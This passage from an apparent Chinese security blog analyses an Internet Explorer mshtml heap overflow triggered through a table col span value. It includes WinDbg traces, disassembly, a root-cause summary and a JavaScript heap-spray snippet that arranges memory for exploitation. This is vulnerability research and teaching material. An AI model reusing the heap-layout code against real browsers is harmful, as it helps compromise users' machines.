fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1d3:</span><br><span class="line">692d02f2 e8c08c0c00      call    mshtml!CImplAry::EnsureSizeWorker (69398fb7)</span><br></pre></td></tr></table></figure></p><p>分配的地址在ebx+0x9C<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; p</span><br><span class="line">eax=00000000 ebx=0492aea8 ecx=7741349f edx=00000000 esi=0492af38 edi=0492af38</span><br><span class="line">eip=692d02f7 esp=0467e410 ebp=0467e4ac iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1df:</span><br><span class="line">692d02f7 85c0            test    eax,eax</span><br><span class="line">1:025&gt; dd ebx+9c</span><br><span class="line">0492af44  07e20f90 00000000 00000000 00000000</span><br><span class="line">0492af54  00000000 00000000 00000000 00000000</span><br><span class="line">0492af64  00000000 000000c8 000000c8 00000000</span><br><span class="line">0492af74  00000000 00000000 00000000 00000000</span><br><span class="line">0492af84  00000000 00000000 00000000 00000000</span><br><span class="line">0492af94  00000000 00000000 00000000 00000000</span><br><span class="line">0492afa4  00000000 00000000 00000000 ffffffff</span><br><span class="line">0492afb4  00000001 00000000 00000000 00000000</span><br><span class="line">1:025&gt; dd 07e20f90 </span><br><span class="line">07e20f90  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fa0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fb0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fc0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20ff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e21000  ???????? ???????? ???????? ????????</span><br><span class="line"></span><br><span class="line">1:025&gt; !heap -p -a 07e20f90 </span><br><span class="line">    address 07e20f90 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 171000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 7e71f70:          7e20f90               70 -          7e20000             2000</span><br></pre></td></tr></table></figure></p><p>此外，我们看一下用于比较的spansum和spancmp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd ebx+54</span><br><span class="line">0492aefc  00000001 00000000 ffffffff 00000000</span><br><span class="line">0492af0c  ffffffff 691c9fd0 00000004 00000004</span><br><span class="line">0492af1c  0497eff0 691c9fd0 00000004 00000004</span><br><span class="line">0492af2c  04936ff0 00000000 00000000 691c9fd0</span><br><span class="line">0492af3c  00000000 00000004 07f27f90 00000000</span><br><span class="line">0492af4c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af5c  00000000 00000000 00000000 000000c8</span><br><span class="line">0492af6c  000000c8 00000000 00000000 00000000</span><br><span class="line">1:025&gt; dd ebx+94</span><br><span class="line">0492af3c  00000000 00000004 07f27f90 00000000</span><br><span class="line">0492af4c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af5c  00000000 00000000 00000000 000000c8</span><br><span class="line">0492af6c  000000c8 00000000 00000000 00000000</span><br><span class="line">0492af7c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af8c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af9c  00000000 00000000 00000000 00000000</span><br><span class="line">0492afac  00000000 ffffffff 00000001 00000000</span><br></pre></td></tr></table></figure></p><p>从上面的代码段可知，这里分配了0x70大小的内存地址在CtableLayout+0x9C指向的地址。<br>总结：</p><ul><li>CtableLayout::CalculateMinMax的第一个参数为CtableLayout对象，即table标签在内存中的对象。</li><li>CtableLayout+0x54：span属性值和spansum</li><li>CtableLayout+0x9C: 保存vulheap,至少分配0x70字节的内存</li><li>CtableLayout+0x94：用于和spansum比较的spancmp,当spancmp&gt;&gt;2小于spansum才分配漏洞堆块。</li></ul><p><strong>要注意的地方</strong><br><strong>再次g之后会出现允许activeX允许这个框，<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-173022.png" alt=""><br>然后发现<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-173337.png" alt=""><br>这我也不知道是中间再次在哪触发了这个函数，还是重新运行了poc，总之这个时候的spansum和spancmp都没变，分别为1和0.<br>我觉得可能是中间又在哪触发了吧，不像是重新运行了，我也不确定是为什么，没有完整的阅读这个模块。<br>总之再次g之后，就和泉哥书上一致了。spansum还是1，spancmp变成4.</strong></p><p>当分配完内存后，执行poc中的over_trigger函数时，会再一次断在CTableLayout::CalculateMinMax函数中，跟进去看下spansum和spancmp的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bl</span><br><span class="line"> 0 e 692d018a     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class="line"> 1 e 692d02f2     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax+0x1d3</span><br><span class="line">1:025&gt; bc 1</span><br><span class="line">1:025&gt; bl</span><br><span class="line"> 0 e 692d018a     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax</span><br></pre></td></tr></table></figure></p><p>把之前设置的多余断点删掉，注意bc后跟的是断点的标号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; g</span><br><span class="line">(c84.e94): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.e94): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.8e8): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.758): Unknown exception - code 80010108 (first chance)</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=063bbea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018a esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd ebx+54</span><br><span class="line">082e6efc  00000001 ffffffff ffffffff ffffffff</span><br><span class="line">082e6f0c  ffffffff 691c9fd0 00000004 00000004</span><br><span class="line">082e6f1c  0816bff0 691c9fd0 00000004 00000004</span><br><span class="line">082e6f2c  082a2ff0 00000000 00000000 691c9fd0</span><br><span class="line">082e6f3c  00000004 00000004 070f4f90 00000000</span><br><span class="line">082e6f4c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6f5c  00000000 00000000 00000000 000000c8</span><br><span class="line">082e6f6c  000000c8 00000000 00000000 00000000</span><br><span class="line">1:025&gt; dd ebx+94</span><br><span class="line">082e6f3c  00000004 00000004 070f4f90 00000000</span><br><span class="line">082e6f4c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6f5c  00000000 00000000 00000000 000000c8</span><br><span class="line">082e6f6c  000000c8 00000000 00000000 00000000</span><br><span class="line">082e6f7c  00000000 00000000 00000000 00000001</span><br><span class="line">082e6f8c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6f9c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6fac  00000000 ffffffff 00000001 00000000</span><br></pre></td></tr></table></figure><p>spansum为1，spancmp的值为4，(4&gt;&gt;2)为1==1,不发生跳转，不分配内存。</p><p>但是在over_trigger中，我们已经将span设置为1000了，这也是允许的最大值。<br>接着执行到mshtml!CTableLayout::CalculateMinMax+0x37e,我本来bp了一个断点在这，然后g一下，可是并没有断下来（这里没有断下来应该还是我断点下错了，没有进入那个断点的语句块），所以没办法，单步p呗，然后发现了新姿势，p 10能一次10下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; p</span><br><span class="line">eax=08864fd0 ebx=082e6ea8 ecx=00000032 edx=00000000 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a2e esp=0467e410 ebp=0467e4ac iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x37e:</span><br><span class="line">69465a2e e8d445dfff      call    mshtml!CTableCol::GetAAspan (6925a007)---&gt;获取span列数，此处返回1</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000001--&gt;返回值 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a33 esp=0467e410 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x383:</span><br><span class="line">69465a33 3de8030000      cmp     eax,3E8h---&gt;span最多为1000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000001 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a38 esp=0467e410 ebp=0467e4ac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x388:</span><br><span class="line">69465a38 894510          mov     dword ptr [ebp+10h],eax ss:0023:0467e4bc=00000000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000001 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a3b esp=0467e410 ebp=0467e4ac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x38b:</span><br><span class="line">69465a3b 7c07            jl      mshtml!CTableLayout::CalculateMinMax+0x394 (69465a44) [br=1]</span><br></pre></td></tr></table></figure></p><p>在mshtml!CTableCol::GetAAspan下断点，让它第二次获取span值的时候断下来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bp mshtml!CTableCol::GetAAspan</span><br><span class="line">1:025&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=082e6ea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=0467df24</span><br><span class="line">eip=692d018a esp=0467dcc8 ebp=0467dee0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br><span class="line">1:025&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=08864fd0 ebx=082e6ea8 ecx=00000032 edx=00000000 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=6925a007 esp=0467dc24 ebp=0467dcc4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableCol::GetAAspan:</span><br><span class="line">6925a007 8bff            mov     edi,edi</span><br><span class="line">1:025&gt; gu</span><br><span class="line">eax=000003e8---&gt;返回值，此时span的值已经是0x3e8即最大值1000了 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a33 esp=0467dc28 ebp=0467dcc4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x383:</span><br><span class="line">69465a33 3de8030000      cmp     eax,3E8h</span><br></pre></td></tr></table></figure></p><p>gu是执行到当前函数结束返回。<br>此时span的值已经是0x3e8即最大值1000了。<br>继续分析后续代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">text:74EC5AB3                 call    ?GetPixelWidth@CWidthUnitValue@@QBEHPBVCDocInfo@@PAVCElement@@H@Z ; CWidthUnitValue::GetPixelWidth(CDocInfo const *,CElement *,int)</span><br><span class="line">.text:74EC5AB8                 cmp     [ebp+var_5C], 0</span><br><span class="line">.text:74EC5ABC                 mov     [ebp+var_2C], eax;---&gt;计算width得到copydata=width*100</span><br><span class="line">....</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">.text:74EC5B3E                 mov     eax, [ebp+arg_8];-----&gt;span=1000</span><br><span class="line">.text:74EC5B41                 imul    ecx, 1Ch----&gt;1000*0x1C</span><br><span class="line">.text:74EC5B44                 add     [ebp+var_38], eax</span><br><span class="line">.text:74EC5B47                 mov     [ebp+var_20], ecx</span><br><span class="line">.text:74EC5B4A                 jmp     short loc_74EC5B4F；----&gt;vulheap地址</span><br><span class="line">.text:74EC5B4C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:74EC5B4C</span><br><span class="line">.text:74EC5B4C loc_74EC5B4C:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195A11j</span><br><span class="line">.text:74EC5B4C                 mov     ecx, [ebp+var_20]</span><br><span class="line">.text:74EC5B4F</span><br><span class="line">.text:74EC5B4F loc_74EC5B4F:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1959C0j</span><br><span class="line">.text:74EC5B4F                 mov     eax, [ebx+9Ch];----&gt;vulheap地址</span><br><span class="line">.text:74EC5B55                 add     eax, ecx;-----&gt;offset=vulheap+1000*0x1c&gt;0x70(vulheap大小)，最终会导致堆溢出！</span><br><span class="line">.text:74EC5B57                 cmp     [ebp+var_1C], 0</span><br><span class="line">.text:74EC5B5B                 mov     [ebp+var_24], eax;----&gt;作为后面AdjustForCol函数的参数</span><br><span class="line">.text:74EC5B5E                 jz      short loc_74EC5B7A</span><br><span class="line">.text:74EC5B60                 mov     eax, [ebp+arg_8]</span><br><span class="line">.text:74EC5B63                 cmp     eax, 1</span><br><span class="line">.text:74EC5B66                 jle     short loc_74EC5B7A</span><br><span class="line">.text:74EC5B68                 dec     eax</span><br><span class="line">.text:74EC5B69                 cmp     [ebp+var_14], eax</span><br><span class="line">.text:74EC5B6C                 jnz     short loc_74EC5B7A</span><br><span class="line">.text:74EC5B6E                 imul    eax, [ebp+var_C]</span><br><span class="line">.text:74EC5B72                 mov     ecx, [ebp+var_2C]</span><br><span class="line">.text:74EC5B75                 sub     ecx, eax        ; this</span><br><span class="line">.text:74EC5B77                 mov     [ebp+var_C], ecx</span><br><span class="line">.text:74EC5B7A                 push    [ebp+var_3C]    ; struct CCalcInfo *</span><br><span class="line">.text:74EC5B7D                 mov     eax, [ebp+var_34]</span><br><span class="line">.text:74EC5B80                 push    [ebp+arg_4]     ; int</span><br><span class="line">.text:74EC5B83                 mov     esi, [ebp+var_24]</span><br><span class="line">.text:74EC5B86                 push    [ebp+var_C]     ; ----&gt;前面经width计算得到的Copydata,即用于复制到vulheap的数据内容。</span><br><span class="line">.text:74EC5B89                 call    ?AdjustForCol@CTableColCalc@@QAEXPBVCWidthUnitValue@@HPAVCCalcInfo@@H@Z ; CTableColCalc::AdjustForCol(CWidthUnitValue const *,int,CCalcInfo *,int)</span><br></pre></td></tr></table></figure></p><p>复制的内容相当于<code>width * 100</code>得到的数值，比如此处为0x41，则复制内容为<code>0x41 * 1000=0x1004</code>。<br>在AdjustForCol中，会以1000 * 0x1c位计数循环向vulheap写入数据，最终造成heap溢出。<br>再g就崩溃了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-173750.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-173811.png" alt=""><br>总结</p><ol><li>当页面加载，CTableLayout::CalculateMinMax被首次调用，col的span属性被初始化为1，此时spansum=1,spancmp=0</li><li>由于(spancmp&gt;&gt;2)&lt;spansum,即0&lt;1,调用EnsureSizeWorker函数分配大小为<code>0x1c * spansum</code>的内存,但至少分配<code>0x1C * 4=0x70</code>大小的内存块。</li><li>分配内存后，spancmp=spansum * 4 = 4,此时(spancmp&gt;&gt;2)==spansum,即4/4==1，因此不再分配内存</li><li>调用over_trigger，CTableLayout::MinMax第二次被调用，但spansum和spancmp未变，而span被更改为1000，在复制内容为<code>width * 100</code>的数据到分配缓冲区时，会以span为循环计数器写vulheap堆块，但是<code>1000 * 0x1C &gt; 0x70</code>，最终造成堆溢出。</li></ol><p>经过调试，泉哥142页<code>shr eax,2</code>理解错了，那个shr是右移的意思，而泉哥写的是左移运算符&lt;&lt;</p><h2 id="实现漏洞利用"><a href="#实现漏洞利用" class="headerlink" title="实现漏洞利用"></a>实现漏洞利用</h2><p>关于exp的编写请参考漏洞战争，这里只调试一些关键思路。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"test"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        &lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line">                </span><br><span class="line"><span class="keyword">var</span> leak_index = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> dap = <span class="string">"EEEE"</span>;</span><br><span class="line">        <span class="keyword">while</span> ( dap.length &lt; <span class="number">480</span> ) dap += dap;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> padding = <span class="string">"AAAA"</span>;</span><br><span class="line">        <span class="keyword">while</span> ( padding.length &lt; <span class="number">480</span> ) padding += padding;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filler = <span class="string">"BBBB"</span>;</span><br><span class="line">        <span class="keyword">while</span> ( filler.length &lt; <span class="number">480</span> ) filler += filler;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//spray</span></span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        <span class="keyword">var</span> rra = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> div_container = <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>);</span><br><span class="line">        div_container.style.cssText = <span class="string">"display:none"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// E</span></span><br><span class="line">            rra[i] = dap.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// S, bstr = A</span></span><br><span class="line">            arr[i] = padding.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// A, bstr = B</span></span><br><span class="line">            arr[i+<span class="number">1</span>] = filler.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// B</span></span><br><span class="line">            <span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br><span class="line">            div_container.appendChild(obj);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">200</span>; i&lt;<span class="number">500</span>; i+=<span class="number">2</span> ) &#123;</span><br><span class="line">            rra[i] = <span class="literal">null</span>;</span><br><span class="line">            CollectGarbage();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>这部分主要是用来构造堆布局,构造结果如下。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-075240.jpg" alt=""><br>然后从中间（200）开始释放EEEE…，腾出空间。<br>释放的位置就是为了在分配vulheap时能够占用到释放位置中的一个，当溢出时就可以占用到后面的字符串和CButtonLayout。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">Microsoft (R) Windows Debugger Version 6.3.9600.17200 X86</span><br><span class="line">Copyright (c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">*** wait with pending attach</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: srv*</span><br><span class="line">ModLoad: 013c0000 01466000   C:\Program Files\Internet Explorer\iexplore.exe</span><br><span class="line">(c0.ea8): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=7ff96000 ebx=00000000 ecx=00000000 edx=77a0d23d esi=00000000 edi=00000000</span><br><span class="line">eip=779a3540 esp=07abfe00 ebp=07abfe2c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">779a3540 cc              int     3</span><br><span class="line">0:021&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:021&gt; .symfix</span><br><span class="line">0:021&gt; .reload</span><br><span class="line">Reloading current modules</span><br><span class="line">................................................................</span><br><span class="line">...........</span><br><span class="line">0:021&gt; sxe ld:jscript</span><br><span class="line">0:021&gt; g</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: srv*</span><br><span class="line">(fd4.630): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=00000000 ebx=00000000 ecx=0014f620 edx=779b64f4 esi=fffffffe edi=00000000</span><br><span class="line">eip=77a0e60e esp=0014f63c ebp=0014f668 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!LdrpDoDebuggerBreak+0x2c:</span><br><span class="line">77a0e60e cc              int     3</span><br><span class="line">1:014&gt;  lmm jscript</span><br><span 